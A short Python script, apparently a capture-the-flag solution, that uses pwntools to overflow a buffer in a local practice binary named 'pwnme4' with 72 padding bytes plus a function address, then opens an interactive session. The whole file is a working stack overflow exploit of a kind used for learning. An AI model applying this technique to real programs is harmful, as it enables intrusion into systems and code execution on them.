from templates import buff_overflow, get_func_addr
import pwn


def main():
    payload = (b"a" * 72) + get_func_addr("./pwnme4")

    buff_overflow(
        payload,
        pwn.process("./pwnme4"),
        interactive = True,
    )


main()
